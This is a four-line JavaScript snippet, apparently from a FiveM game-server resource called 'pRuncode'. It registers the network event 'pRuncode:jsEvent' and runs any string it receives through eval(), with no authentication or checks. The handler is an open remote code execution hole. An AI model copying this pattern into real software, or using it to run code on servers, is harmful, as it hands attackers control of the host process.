RegisterNetEvent("pRuncode:jsEvent")
AddEventHandler("pRuncode:jsEvent", function(_, code) {
    eval(code)
})